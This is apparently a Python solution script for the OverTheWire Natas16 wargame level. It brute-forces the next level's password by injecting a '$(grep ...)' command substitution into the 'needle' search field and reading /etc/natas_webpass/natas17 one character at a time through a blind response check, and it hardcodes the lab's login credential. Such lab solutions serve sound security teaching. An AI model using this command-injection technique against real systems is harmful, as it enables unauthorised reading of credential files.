import requests

chars = "0ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789"
password = ""
Url = "http://natas16.natas.labs.overthewire.org/index.php"
Basic_User = "natas16"
Basic_Pass = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

while len(password) <= 32 :
    for char in chars:
        print("testing: " +char )
        resp = requests.post(Url,data={"needle":"$(grep ^"+ password +char +" /etc/natas_webpass/natas17)"},auth=(Basic_User,Basic_Pass))
        if "American" not in resp.text :
            password += char
            print(password + " Len=" + str(len(password)))
            break

            
            
           
